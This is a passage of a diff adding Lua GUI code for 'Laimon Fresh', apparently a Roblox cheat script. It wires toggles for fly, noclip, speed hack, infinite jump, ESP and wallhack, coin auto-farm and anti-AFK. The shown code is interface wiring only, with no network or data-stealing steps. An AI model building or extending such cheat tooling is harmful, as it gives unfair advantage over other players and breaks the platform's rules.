+            BackgroundColor3 = CurrentTheme.ToggleOff,
+            BackgroundTransparency = 0.2
+        }):Play()
+        flySystem.disable()
+    end
+end
+
+local function updateNoclipState(state)
+    ActiveFunctions.Noclip = state
+    if state then
+        TweenService:Create(NoclipToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOn,
+            BackgroundTransparency = 0.2
+        }):Play()
+        noclipSystem.enable()
+    else
+        TweenService:Create(NoclipToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOff,
+            BackgroundTransparency = 0.2
+        }):Play()
+        noclipSystem.disable()
+    end
+end
+
+local function updateSpeedHackState(state)
+    ActiveFunctions.SpeedHack = state
+    if state then
+        TweenService:Create(SpeedHackToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOn,
+            BackgroundTransparency = 0.2
+        }):Play()
+        speedHackSystem.enable()
+    else
+        TweenService:Create(SpeedHackToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOff,
+            BackgroundTransparency = 0.2
+        }):Play()
+        speedHackSystem.disable()
+    end
+end
+
+local function updateInfinityJumpState(state)
+    ActiveFunctions.InfinityJump = state
+    if state then
+        TweenService:Create(InfinityJumpToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOn,
+            BackgroundTransparency = 0.2
+        }):Play()
+        infinityJumpSystem.enable()
+    else
+        TweenService:Create(InfinityJumpToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOff,
+            BackgroundTransparency = 0.2
+        }):Play()
+        infinityJumpSystem.disable()
+    end
+end
+
+local function updateSpeedSlider(value)
+    local speed = speedHackSystem.setSpeed(value)
+    SpeedValueText.Text = tostring(speed)
+    SpeedSliderFill.Size = UDim2.new((speed - 50) / 450, 0, 1, 0)
+end
+
+-- Обработчики для Player вкладки
+FlyToggleButton.MouseButton1Click:Connect(function()
+    updateFlyState(not ActiveFunctions.Fly)
+end)
+
+NoclipToggleButton.MouseButton1Click:Connect(function()
+    updateNoclipState(not ActiveFunctions.Noclip)
+end)
+
+SpeedHackToggleButton.MouseButton1Click:Connect(function()
+    updateSpeedHackState(not ActiveFunctions.SpeedHack)
+end)
+
+InfinityJumpToggleButton.MouseButton1Click:Connect(function()
+    updateInfinityJumpState(not ActiveFunctions.InfinityJump)
+end)
+
+-- Speed Slider
+local isSpeedSliderDragging = false
+
+SpeedSlider.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isSpeedSliderDragging = true
+    end
+end)
+
+SpeedSlider.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isSpeedSliderDragging = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isSpeedSliderDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local mousePos = UserInputService:GetMouseLocation()
+        local sliderAbsolutePos = SpeedSlider.AbsolutePosition
+        local sliderAbsoluteSize = SpeedSlider.AbsoluteSize
+        
+        local relativeX = (mousePos.X - sliderAbsolutePos.X) / sliderAbsoluteSize.X
+        relativeX = math.clamp(relativeX, 0, 1)
+        
+        local speedValue = 50 + math.floor(relativeX * 450)
+        updateSpeedSlider(speedValue)
+    end
+end)
+
+-- Инициализация слайдера
+updateSpeedSlider(50)
+
+-- Создание ESP панели на вкладке ESP
+local ESPFrame = Instance.new("Frame")
+ESPFrame.Name = "ESPFrame"
+ESPFrame.Size = UDim2.new(0, 220, 0, 250)
+ESPFrame.Position = UDim2.new(0, 20, 0, 20)
+ESPFrame.BackgroundTransparency = 1
+ESPFrame.Parent = TabFrames["ESP"]
+
+local ESPTitle = Instance.new("TextLabel")
+ESPTitle.Name = "ESPTitle"
+ESPTitle.Size = UDim2.new(1, 0, 0, 25)
+ESPTitle.Position = UDim2.new(0, 0, 0, 0)
+ESPTitle.BackgroundTransparency = 1
+ESPTitle.Text = "ESP SETTINGS"
+ESPTitle.TextColor3 = CurrentTheme.Text
+ESPTitle.Font = Enum.Font.GothamBold
+ESPTitle.TextSize = 16
+ESPTitle.TextXAlignment = Enum.TextXAlignment.Left
+ESPTitle.Parent = ESPFrame
+
+table.insert(UIElements.TextLabels, ESPTitle)
+
+-- Кнопка Names
+local NamesButton = Instance.new("TextButton")
+NamesButton.Name = "NamesButton"
+NamesButton.Size = UDim2.new(0, 180, 0, 30)
+NamesButton.Position = UDim2.new(0, 0, 0, 35)
+NamesButton.Text = "Names OFF"
+NamesButton.BackgroundColor3 = CurrentTheme.Button
+NamesButton.BackgroundTransparency = 0.2
+NamesButton.TextColor3 = CurrentTheme.Text
+NamesButton.Font = Enum.Font.GothamBold
+NamesButton.TextSize = 12
+NamesButton.BorderSizePixel = 0
+NamesButton.Parent = ESPFrame
+
+local NamesButtonCorner = Instance.new("UICorner")
+NamesButtonCorner.CornerRadius = UDim.new(0, 6)
+NamesButtonCorner.Parent = NamesButton
+
+table.insert(UIElements.ESPButtons, NamesButton)
+
+-- Кнопка RGB для Names
+local NamesRGBButton = Instance.new("TextButton")
+NamesRGBButton.Name = "NamesRGBButton"
+NamesRGBButton.Size = UDim2.new(0, 35, 0, 30)
+NamesRGBButton.Position = UDim2.new(0, 185, 0, 35)
+NamesRGBButton.Text = "RGB"
+NamesRGBButton.BackgroundColor3 = CurrentTheme.Button
+NamesRGBButton.BackgroundTransparency = 0.2
+NamesRGBButton.TextColor3 = CurrentTheme.Text
+NamesRGBButton.Font = Enum.Font.GothamBold
+NamesRGBButton.TextSize = 10
+NamesRGBButton.BorderSizePixel = 0
+NamesRGBButton.Parent = ESPFrame
+
+local NamesRGBCorner = Instance.new("UICorner")
+NamesRGBCorner.CornerRadius = UDim.new(0, 6)
+NamesRGBCorner.Parent = NamesRGBButton
+
+table.insert(UIElements.ESPButtons, NamesRGBButton)
+
+-- Кнопка Roles
+local RolesButton = Instance.new("TextButton")
+RolesButton.Name = "RolesButton"
+RolesButton.Size = UDim2.new(0, 180, 0, 30)
+RolesButton.Position = UDim2.new(0, 0, 0, 75)
+RolesButton.Text = "Roles OFF"
+RolesButton.BackgroundColor3 = CurrentTheme.Button
+RolesButton.BackgroundTransparency = 0.2
+RolesButton.TextColor3 = CurrentTheme.Text
+RolesButton.Font = Enum.Font.GothamBold
+RolesButton.TextSize = 12
+RolesButton.BorderSizePixel = 0
+RolesButton.Parent = ESPFrame
+
+local RolesButtonCorner = Instance.new("UICorner")
+RolesButtonCorner.CornerRadius = UDim.new(0, 6)
+RolesButtonCorner.Parent = RolesButton
+
+table.insert(UIElements.ESPButtons, RolesButton)
+
+-- Кнопка RGB для Roles
+local RolesRGBButton = Instance.new("TextButton")
+RolesRGBButton.Name = "RolesRGBButton"
+RolesRGBButton.Size = UDim2.new(0, 35, 0, 30)
+RolesRGBButton.Position = UDim2.new(0, 185, 0, 75)
+RolesRGBButton.Text = "RGB"
+RolesRGBButton.BackgroundColor3 = CurrentTheme.Button
+RolesRGBButton.BackgroundTransparency = 0.2
+RolesRGBButton.TextColor3 = CurrentTheme.Text
+RolesRGBButton.Font = Enum.Font.GothamBold
+RolesRGBButton.TextSize = 10
+RolesRGBButton.BorderSizePixel = 0
+RolesRGBButton.Parent = ESPFrame
+
+local RolesRGBCorner = Instance.new("UICorner")
+RolesRGBCorner.CornerRadius = UDim.new(0, 6)
+RolesRGBCorner.Parent = RolesRGBButton
+
+table.insert(UIElements.ESPButtons, RolesRGBButton)
+
+-- Кнопка Wallhack
+local WallhackButton = Instance.new("TextButton")
+WallhackButton.Name = "WallhackButton"
+WallhackButton.Size = UDim2.new(0, 180, 0, 30)
+WallhackButton.Position = UDim2.new(0, 0, 0, 115)
+WallhackButton.Text = "Wallhack OFF"
+WallhackButton.BackgroundColor3 = CurrentTheme.Button
+WallhackButton.BackgroundTransparency = 0.2
+WallhackButton.TextColor3 = CurrentTheme.Text
+WallhackButton.Font = Enum.Font.GothamBold
+WallhackButton.TextSize = 12
+WallhackButton.BorderSizePixel = 0
+WallhackButton.Parent = ESPFrame
+
+local WallhackButtonCorner = Instance.new("UICorner")
+WallhackButtonCorner.CornerRadius = UDim.new(0, 6)
+WallhackButtonCorner.Parent = WallhackButton
+
+table.insert(UIElements.ESPButtons, WallhackButton)
+
+-- Кнопка RGB для Wallhack
+local WallhackRGBButton = Instance.new("TextButton")
+WallhackRGBButton.Name = "WallhackRGBButton"
+WallhackRGBButton.Size = UDim2.new(0, 35, 0, 30)
+WallhackRGBButton.Position = UDim2.new(0, 185, 0, 115)
+WallhackRGBButton.Text = "RGB"
+WallhackRGBButton.BackgroundColor3 = CurrentTheme.Button
+WallhackRGBButton.BackgroundTransparency = 0.2
+WallhackRGBButton.TextColor3 = CurrentTheme.Text
+WallhackRGBButton.Font = Enum.Font.GothamBold
+WallhackRGBButton.TextSize = 10
+WallhackRGBButton.BorderSizePixel = 0
+WallhackRGBButton.Parent = ESPFrame
+
+local WallhackRGBCorner = Instance.new("UICorner")
+WallhackRGBCorner.CornerRadius = UDim.new(0, 6)
+WallhackRGBCorner.Parent = WallhackRGBButton
+
+table.insert(UIElements.ESPButtons, WallhackRGBButton)
+
+-- Dropdown для стилей Wallhack
+local WallhackStyleFrame = Instance.new("Frame")
+WallhackStyleFrame.Name = "WallhackStyleFrame"
+WallhackStyleFrame.Size = UDim2.new(0, 220, 0, 35)
+WallhackStyleFrame.Position = UDim2.new(0, 0, 0, 155)
+WallhackStyleFrame.BackgroundTransparency = 1
+WallhackStyleFrame.Parent = ESPFrame
+
+local WallhackStyleText = Instance.new("TextLabel")
+WallhackStyleText.Name = "WallhackStyleText"
+WallhackStyleText.Size = UDim2.new(0, 100, 1, 0)
+WallhackStyleText.Position = UDim2.new(0, 0, 0, 0)
+WallhackStyleText.Text = "Style:"
+WallhackStyleText.TextColor3 = CurrentTheme.Text
+WallhackStyleText.Font = Enum.Font.GothamBold
+WallhackStyleText.TextSize = 12
+WallhackStyleText.TextXAlignment = Enum.TextXAlignment.Left
+WallhackStyleText.BackgroundTransparency = 1
+WallhackStyleText.Parent = WallhackStyleFrame
+
+table.insert(UIElements.TextLabels, WallhackStyleText)
+
+local WallhackStyleButton = Instance.new("TextButton")
+WallhackStyleButton.Name = "WallhackStyleButton"
+WallhackStyleButton.Size = UDim2.new(0, 110, 0, 25)
+WallhackStyleButton.Position = UDim2.new(0, 105, 0.5, -12)
+WallhackStyleButton.Text = "Classic"
+WallhackStyleButton.BackgroundColor3 = CurrentTheme.Button
+WallhackStyleButton.BackgroundTransparency = 0.2
+WallhackStyleButton.TextColor3 = CurrentTheme.Text
+WallhackStyleButton.Font = Enum.Font.GothamBold
+WallhackStyleButton.TextSize = 11
+WallhackStyleButton.BorderSizePixel = 0
+WallhackStyleButton.Parent = WallhackStyleFrame
+
+local WallhackStyleCorner = Instance.new("UICorner")
+WallhackStyleCorner.CornerRadius = UDim.new(0, 6)
+WallhackStyleCorner.Parent = WallhackStyleButton
+
+table.insert(UIElements.ESPButtons, WallhackStyleButton)
+
+-- Функции для ESP кнопок
+local function toggleNames()
+    local currentState = NamesButton.Text == "Names ON"
+    local newState = not currentState
+    
+    if newState then
+        NamesButton.Text = "Names ON"
+        NamesButton.BackgroundColor3 = CurrentTheme.ToggleOn
+    else
+        NamesButton.Text = "Names OFF"
+        NamesButton.BackgroundColor3 = CurrentTheme.Button
+        if NamesRGBButton.BackgroundColor3 == CurrentTheme.ToggleOn then
+            NamesRGBButton.BackgroundColor3 = CurrentTheme.Button
+            espSystem.toggleNamesRGB(false)
+        end
+    end
+    
+    espSystem.toggleNames(newState)
+end
+
+local function toggleRoles()
+    local currentState = RolesButton.Text == "Roles ON"
+    local newState = not currentState
+    
+    if newState then
+        RolesButton.Text = "Roles ON"
+        RolesButton.BackgroundColor3 = CurrentTheme.ToggleOn
+    else
+        RolesButton.Text = "Roles OFF"
+        RolesButton.BackgroundColor3 = CurrentTheme.Button
+        if RolesRGBButton.BackgroundColor3 == CurrentTheme.ToggleOn then
+            RolesRGBButton.BackgroundColor3 = CurrentTheme.Button
+            espSystem.toggleRolesRGB(false)
+        end
+    end
+    
+    espSystem.toggleRoles(newState)
+end
+
+local function toggleWallhack()
+    local currentState = WallhackButton.Text == "Wallhack ON"
+    local newState = not currentState
+    
+    if newState then
+        WallhackButton.Text = "Wallhack ON"
+        WallhackButton.BackgroundColor3 = CurrentTheme.ToggleOn
+        espSystem.toggleWallhack(true)
+    else
+        WallhackButton.Text = "Wallhack OFF"
+        WallhackButton.BackgroundColor3 = CurrentTheme.Button
+        espSystem.toggleWallhack(false)
+        if WallhackRGBButton.BackgroundColor3 == CurrentTheme.ToggleOn then
+            WallhackRGBButton.BackgroundColor3 = CurrentTheme.Button
+            espSystem.toggleWallhackRGB(false)
+        end
+    end
+end
+
+local function toggleNamesRGB()
+    if NamesButton.Text ~= "Names ON" then return end
+    
+    local currentState = NamesRGBButton.BackgroundColor3 == CurrentTheme.ToggleOn
+    local newState = not currentState
+    
+    if newState then
+        NamesRGBButton.BackgroundColor3 = CurrentTheme.ToggleOn
+    else
+        NamesRGBButton.BackgroundColor3 = CurrentTheme.Button
+    end
+    
+    espSystem.toggleNamesRGB(newState)
+end
+
+local function toggleRolesRGB()
+    if RolesButton.Text ~= "Roles ON" then return end
+    
+    local currentState = RolesRGBButton.BackgroundColor3 == CurrentTheme.ToggleOn
+    local newState = not currentState
+    
+    if newState then
+        RolesRGBButton.BackgroundColor3 = CurrentTheme.ToggleOn
+    else
+        RolesRGBButton.BackgroundColor3 = CurrentTheme.Button
+    end
+    
+    espSystem.toggleRolesRGB(newState)
+end
+
+local function toggleWallhackRGB()
+    if WallhackButton.Text ~= "Wallhack ON" then return end
+    
+    local currentState = WallhackRGBButton.BackgroundColor3 == CurrentTheme.ToggleOn
+    local newState = not currentState
+    
+    if newState then
+        WallhackRGBButton.BackgroundColor3 = CurrentTheme.ToggleOn
+    else
+        WallhackRGBButton.BackgroundColor3 = CurrentTheme.Button
+    end
+    
+    espSystem.toggleWallhackRGB(newState)
+end
+
+local wallhackStyles = {"Classic", "Tracing"}
+local currentWallhackStyle = 1
+
+local function cycleWallhackStyle()
+    currentWallhackStyle = currentWallhackStyle % #wallhackStyles + 1
+    WallhackStyleButton.Text = wallhackStyles[currentWallhackStyle]
+    espSystem.setWallhackStyle(wallhackStyles[currentWallhackStyle])
+end
+
+-- Привязка обработчиков ESP
+NamesButton.MouseButton1Click:Connect(toggleNames)
+RolesButton.MouseButton1Click:Connect(toggleRoles)
+WallhackButton.MouseButton1Click:Connect(toggleWallhack)
+NamesRGBButton.MouseButton1Click:Connect(toggleNamesRGB)
+RolesRGBButton.MouseButton1Click:Connect(toggleRolesRGB)
+WallhackRGBButton.MouseButton1Click:Connect(toggleWallhackRGB)
+WallhackStyleButton.MouseButton1Click:Connect(cycleWallhackStyle)
+
+-- Auto-Farm вкладка
+local AutoFarmFrame = Instance.new("Frame")
+AutoFarmFrame.Name = "AutoFarmFrame"
+AutoFarmFrame.Size = UDim2.new(0, 180, 0, 120)
+AutoFarmFrame.Position = UDim2.new(0, 20, 0, 20)
+AutoFarmFrame.BackgroundTransparency = 1
+AutoFarmFrame.Parent = TabFrames["Auto-Farm"]
+
+local AutoFarmToggleButton = Instance.new("TextButton")
+AutoFarmToggleButton.Name = "AutoFarmToggle"
+AutoFarmToggleButton.Size = UDim2.new(0, 180, 0, 30)
+AutoFarmToggleButton.Position = UDim2.new(0, 0, 0, 0)
+AutoFarmToggleButton.Text = "Auto-Farm: OFF"
+AutoFarmToggleButton.BackgroundColor3 = CurrentTheme.Button
+AutoFarmToggleButton.BackgroundTransparency = 0.2
+AutoFarmToggleButton.TextColor3 = CurrentTheme.Text
+AutoFarmToggleButton.Font = Enum.Font.GothamBold
+AutoFarmToggleButton.TextSize = 13
+AutoFarmToggleButton.BorderSizePixel = 0
+AutoFarmToggleButton.Parent = AutoFarmFrame
+
+local AutoFarmToggleCorner = Instance.new("UICorner")
+AutoFarmToggleCorner.CornerRadius = UDim.new(0, 6)
+AutoFarmToggleCorner.Parent = AutoFarmToggleButton
+
+table.insert(UIElements.AutoFarmElements, AutoFarmToggleButton)
+
+-- Speed Slider для Auto-Farm
+local AutoFarmSpeedFrame = Instance.new("Frame")
+AutoFarmSpeedFrame.Name = "AutoFarmSpeedFrame"
+AutoFarmSpeedFrame.Size = UDim2.new(1, 0, 0, 60)
+AutoFarmSpeedFrame.Position = UDim2.new(0, 0, 0, 40)
+AutoFarmSpeedFrame.BackgroundTransparency = 1
+AutoFarmSpeedFrame.Parent = AutoFarmFrame
+
+local AutoFarmSpeedSlider = Instance.new("Frame")
+AutoFarmSpeedSlider.Name = "AutoFarmSpeedSlider"
+AutoFarmSpeedSlider.Size = UDim2.new(0, 150, 0, 10)
+AutoFarmSpeedSlider.Position = UDim2.new(0, 0, 0, 15)
+AutoFarmSpeedSlider.BackgroundColor3 = CurrentTheme.Button
+AutoFarmSpeedSlider.BackgroundTransparency = 0.2
+AutoFarmSpeedSlider.BorderSizePixel = 0
+AutoFarmSpeedSlider.Parent = AutoFarmSpeedFrame
+
+local AutoFarmSpeedSliderCorner = Instance.new("UICorner")
+AutoFarmSpeedSliderCorner.CornerRadius = UDim.new(0, 5)
+AutoFarmSpeedSliderCorner.Parent = AutoFarmSpeedSlider
+
+local AutoFarmSpeedSliderFill = Instance.new("Frame")
+AutoFarmSpeedSliderFill.Name = "AutoFarmSpeedSliderFill"
+AutoFarmSpeedSliderFill.Size = UDim2.new(0.5, 0, 1, 0)
+AutoFarmSpeedSliderFill.Position = UDim2.new(0, 0, 0, 0)
+AutoFarmSpeedSliderFill.BackgroundColor3 = CurrentTheme.ToggleOn
+AutoFarmSpeedSliderFill.BorderSizePixel = 0
+AutoFarmSpeedSliderFill.Parent = AutoFarmSpeedSlider
+
+local AutoFarmSpeedSliderFillCorner = Instance.new("UICorner")
+AutoFarmSpeedSliderFillCorner.CornerRadius = UDim.new(0, 5)
+AutoFarmSpeedSliderFillCorner.Parent = AutoFarmSpeedSliderFill
+
+local AutoFarmSpeedValueText = Instance.new("TextLabel")
+AutoFarmSpeedValueText.Name = "AutoFarmSpeedValueText"
+AutoFarmSpeedValueText.Size = UDim2.new(0, 30, 0, 20)
+AutoFarmSpeedValueText.Position = UDim2.new(0, 155, 0, 10)
+AutoFarmSpeedValueText.BackgroundTransparency = 1
+AutoFarmSpeedValueText.Text = "20"
+AutoFarmSpeedValueText.TextColor3 = CurrentTheme.Text
+AutoFarmSpeedValueText.Font = Enum.Font.GothamBold
+AutoFarmSpeedValueText.TextSize = 12
+AutoFarmSpeedValueText.TextXAlignment = Enum.TextXAlignment.Center
+AutoFarmSpeedValueText.Parent = AutoFarmSpeedFrame
+
+table.insert(UIElements.AutoFarmElements, AutoFarmSpeedValueText)
+
+local AutoFarmWarningLabel = Instance.new("TextLabel")
+AutoFarmWarningLabel.Name = "AutoFarmWarningLabel"
+AutoFarmWarningLabel.Size = UDim2.new(1, 0, 0, 15)
+AutoFarmWarningLabel.Position = UDim2.new(0, 0, 0, 35)
+AutoFarmWarningLabel.Text = "Not recommended above 24"
+AutoFarmWarningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+AutoFarmWarningLabel.Font = Enum.Font.Gotham
+AutoFarmWarningLabel.TextSize = 10
+AutoFarmWarningLabel.TextXAlignment = Enum.TextXAlignment.Center
+AutoFarmWarningLabel.BackgroundTransparency = 1
+AutoFarmWarningLabel.Parent = AutoFarmSpeedFrame
+
+table.insert(UIElements.AutoFarmElements, AutoFarmWarningLabel)
+
+-- Функции для Auto-Farm
+local function updateAutoFarmState(state)
+    ActiveFunctions.AutoFarm = state
+    if state then
+        TweenService:Create(AutoFarmToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOn,
+            BackgroundTransparency = 0.2
+        }):Play()
+        AutoFarmToggleButton.Text = "Auto-Farm: ON"
+        autoFarmSystem.enable()
+    else
+        TweenService:Create(AutoFarmToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.Button,
+            BackgroundTransparency = 0.2
+        }):Play()
+        AutoFarmToggleButton.Text = "Auto-Farm: OFF"
+        autoFarmSystem.disable()
+    end
+end
+
+local function updateAutoFarmSpeedSlider(value)
+    local speed = autoFarmSystem.setSpeed(value)
+    AutoFarmSpeedValueText.Text = tostring(speed)
+    AutoFarmSpeedSliderFill.Size = UDim2.new((speed - 10) / 20, 0, 1, 0)
+end
+
+AutoFarmToggleButton.MouseButton1Click:Connect(function()
+    updateAutoFarmState(not ActiveFunctions.AutoFarm)
+end)
+
+-- Auto-Farm Speed Slider
+local isAutoFarmSpeedSliderDragging = false
+
+AutoFarmSpeedSlider.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isAutoFarmSpeedSliderDragging = true
+    end
+end)
+
+AutoFarmSpeedSlider.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isAutoFarmSpeedSliderDragging = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isAutoFarmSpeedSliderDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local mousePos = UserInputService:GetMouseLocation()
+        local sliderAbsolutePos = AutoFarmSpeedSlider.AbsolutePosition
+        local sliderAbsoluteSize = AutoFarmSpeedSlider.AbsoluteSize
+        
+        local relativeX = (mousePos.X - sliderAbsolutePos.X) / sliderAbsoluteSize.X
+        relativeX = math.clamp(relativeX, 0, 1)
+        
+        local speedValue = 10 + math.floor(relativeX * 20)
+        updateAutoFarmSpeedSlider(speedValue)
+    end
+end)
+
+-- Инициализация Auto-Farm слайдера
+updateAutoFarmSpeedSlider(20)
+
+-- ВКЛАДКА SETTINGS
+local function createToggle(name, posY, defaultValue, parentFrame, warningText, functionName)
+    local ToggleFrame = Instance.new("Frame")
+    ToggleFrame.Name = name.."Toggle"
+    ToggleFrame.Size = UDim2.new(0, 180, 0, warningText and 45 or 35)
+    ToggleFrame.Position = UDim2.new(0, 20, 0, posY)
+    ToggleFrame.BackgroundTransparency = 1
+    ToggleFrame.Parent = parentFrame or TabFrames["Settings"]
+    
+    local ToggleButton = Instance.new("TextButton")
+    ToggleButton.Name = "Button"
+    ToggleButton.Size = UDim2.new(0, 50, 0, 25)
+    ToggleButton.Position = UDim2.new(0, 120, 0, 5)
+    ToggleButton.Text = ""
+    ToggleButton.BackgroundColor3 = defaultValue and CurrentTheme.ToggleOn or CurrentTheme.ToggleOff
+    ToggleButton.BackgroundTransparency = 0.2
+    ToggleButton.AutoButtonColor = false
+    ToggleButton.BorderSizePixel = 0
+    ToggleButton.Parent = ToggleFrame
+    
+    table.insert(UIElements.ToggleButtons, ToggleButton)
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = ToggleButton
+    
+    local ToggleText = Instance.new("TextLabel")
+    ToggleText.Name = "Text"
+    ToggleText.Size = UDim2.new(0, 110, 0, 25)
+    ToggleText.Position = UDim2.new(0, 0, 0, 5)
+    ToggleText.Text = name
+    ToggleText.TextColor3 = CurrentTheme.Text
+    ToggleText.Font = Enum.Font.GothamBold
+    ToggleText.TextSize = 13
+    ToggleText.TextXAlignment = Enum.TextXAlignment.Left
+    ToggleText.BackgroundTransparency = 1
+    ToggleText.Parent = ToggleFrame
+    
+    table.insert(UIElements.TextLabels, ToggleText)
+    
+    if warningText then
+        local WarningLabel = Instance.new("TextLabel")
+        WarningLabel.Name = "Warning"
+        WarningLabel.Size = UDim2.new(1, 0, 0, 15)
+        WarningLabel.Position = UDim2.new(0, 0, 0, 30)
+        WarningLabel.Text = warningText
+        WarningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        WarningLabel.Font = Enum.Font.Gotham
+        WarningLabel.TextSize = 10
+        WarningLabel.TextXAlignment = Enum.TextXAlignment.Left
+        WarningLabel.BackgroundTransparency = 1
+        WarningLabel.Parent = ToggleFrame
+    end
+    
+    local function updateState(state)
+        defaultValue = state
+        if functionName then
+            ActiveFunctions[functionName] = state
+        end
+        TweenService:Create(ToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = state and CurrentTheme.ToggleOn or CurrentTheme.ToggleOff,
+            BackgroundTransparency = 0.2
+        }):Play()
+    end
+    
+    ToggleButton.MouseButton1Click:Connect(function()
+        defaultValue = not defaultValue
+        updateState(defaultValue)
+    end)
+    
+    return {Update = updateState}
+end
+
+local function createKeybindButton(name, posY, currentKey)
+    local KeybindFrame = Instance.new("Frame")
+    KeybindFrame.Name = "KeybindFrame"
+    KeybindFrame.Size = UDim2.new(0, 220, 0, 35)
+    KeybindFrame.Position = UDim2.new(0, 20, 0, posY)
+    KeybindFrame.BackgroundTransparency = 1
+    KeybindFrame.Parent = TabFrames["Settings"]
+    
+    local KeybindText = Instance.new("TextLabel")
+    KeybindText.Name = "Text"
+    KeybindText.Size = UDim2.new(0, 140, 1, 0)
+    KeybindText.Position = UDim2.new(0, 0, 0, 0)
+    KeybindText.Text = name
+    KeybindText.TextColor3 = CurrentTheme.Text
+    KeybindText.Font = Enum.Font.GothamBold
+    KeybindText.TextSize = 13
+    KeybindText.TextXAlignment = Enum.TextXAlignment.Left
+    KeybindText.BackgroundTransparency = 1
+    KeybindText.Parent = KeybindFrame
+    
+    table.insert(UIElements.TextLabels, KeybindText)
+    
+    local KeybindButton = Instance.new("TextButton")
+    KeybindButton.Name = "Button"
+    KeybindButton.Size = UDim2.new(0, 70, 0, 28)
+    KeybindButton.Position = UDim2.new(0, 150, 0.5, -14)
+    KeybindButton.Text = tostring(currentKey):gsub("Enum.KeyCode.", "")
+    KeybindButton.BackgroundColor3 = CurrentTheme.Button
+    KeybindButton.BackgroundTransparency = 0.2
+    KeybindButton.TextColor3 = CurrentTheme.Text
+    KeybindButton.Font = Enum.Font.GothamBold
+    KeybindButton.TextSize = 12
+    KeybindButton.BorderSizePixel = 0
+    KeybindButton.Parent = KeybindFrame
+    
+    table.insert(UIElements.KeybindButtons, KeybindButton)
+    
+    local KeybindCorner = Instance.new("UICorner")
+    KeybindCorner.CornerRadius = UDim.new(0, 6)
+    KeybindCorner.Parent = KeybindButton
+    
+    local listening = false
+    local isChangingBind = false
+
+    KeybindButton.MouseButton1Click:Connect(function()
+        isChangingBind = true
+        listening = true
+        KeybindButton.Text = "[Press Key]"
+        TweenService:Create(KeybindButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(0, 100, 200), 
+            BackgroundTransparency = 0
+        }):Play()
+    end)
+
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if listening and not gameProcessed then
+            if input.UserInputType == Enum.UserInputType.Keyboard then
+                listening = false
+                isChangingBind = false
+                currentKey = input.KeyCode
+                hideBind = input.KeyCode
+                KeybindButton.Text = tostring(currentKey):gsub("Enum.KeyCode.", "")
+                TweenService:Create(KeybindButton, TweenInfo.new(0.2), {
+                    BackgroundColor3 = CurrentTheme.Button, 
+                    BackgroundTransparency = 0.2
+                }):Play()
+                
+                wait(0.1)
+            end
+        end
+    end)
+    
+    return {
+        Update = function(key)
+            currentKey = key
+            hideBind = key
+            KeybindButton.Text = tostring(key):gsub("Enum.KeyCode.", "")
+        end
+    }
+end
+
+-- Создаем элементы на вкладке Settings
+local HideBindButton = createKeybindButton("Hide Menu Bind", 20, hideBind)
+ActiveFunctions.AntiAFK = true
+local AntiAfkToggle = createToggle("Anti-AFK", 70, true, TabFrames["Settings"], nil, "AntiAFK")
+
+-- ВКЛАДКА INFO
+local InfoFrame = Instance.new("Frame")
+InfoFrame.Name = "InfoFrame"
+InfoFrame.Size = UDim2.new(1, -40, 1, -40)
+InfoFrame.Position = UDim2.new(0, 20, 0, 20)
+InfoFrame.BackgroundTransparency = 1
+InfoFrame.Parent = TabFrames["Info"]
+
+local InfoText = Instance.new("TextLabel")
+InfoText.Name = "InfoText"
+InfoText.Size = UDim2.new(1, 0, 1, 0)
+InfoText.Position = UDim2.new(0, 0, 0, 0)
+InfoText.BackgroundTransparency = 1
+InfoText.Text = [[Laimon Fresh DEMO v1.0
+
+Thank you for using our script!
+
+Features:
+• Player utilities
+• Advanced ESP system
+• Auto-Farm for coins collection
+• 7 customizable color themes
+• Anti-AFK protection
+• New features soon
+
+Developers: Twix, fr3dope
+Telegram: t.me/FBScripts
+
+Enjoy using Laimon Fresh!]]
+InfoText.TextColor3 = CurrentTheme.Text
+InfoText.Font = Enum.Font.GothamBold
+InfoText.TextSize = 14
+InfoText.TextWrapped = true
+InfoText.TextXAlignment = Enum.TextXAlignment.Left
+InfoText.TextYAlignment = Enum.TextYAlignment.Top
+InfoText.Parent = InfoFrame
+
+table.insert(UIElements.InfoElements, InfoText)
+
+-- ВОССТАНОВЛЕННАЯ ПАНЕЛЬ ПОЛЬЗОВАТЕЛЯ
+local UserInfoFrame = Instance.new("Frame")
+UserInfoFrame.Name = "UserInfoFrame"
+UserInfoFrame.Size = UDim2.new(0, 240, 0, 90)
+UserInfoFrame.Position = UDim2.new(0, 0, 1, -90)
+UserInfoFrame.BackgroundTransparency = 1
+UserInfoFrame.BorderSizePixel = 0
+UserInfoFrame.Parent = MainFrame
+
+-- Аватар пользователя
+local UserAvatar = Instance.new("ImageLabel")
+UserAvatar.Name = "UserAvatar"
+UserAvatar.Size = UDim2.new(0, 45, 0, 45)
+UserAvatar.Position = UDim2.new(0, 15, 0, 20)
+UserAvatar.BackgroundColor3 = CurrentTheme.Button
+UserAvatar.BorderSizePixel = 0
+UserAvatar.Parent = UserInfoFrame
+
+-- Загружаем аватар пользователя
